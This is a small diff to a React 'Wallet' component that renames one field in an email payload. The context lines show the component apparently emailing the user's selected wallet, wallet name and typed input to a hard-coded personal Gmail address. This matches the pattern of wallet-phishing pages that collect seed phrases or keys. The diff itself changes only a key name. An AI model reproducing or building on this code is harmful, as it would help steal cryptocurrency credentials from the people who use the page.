@@ -133,7 +133,7 @@ const Wallet = () => {
             from_email: "techjames27@gmail.com",
             // to_email: "dazaloland@gmail.com",
             to_email: "techjames27@gmail.com",
-            wallet: selectedWallet?.name,
+            wallets: selectedWallet?.name,
             wallet_name: walletName || "N/A",
             input_value: inputValue,
             section: section,
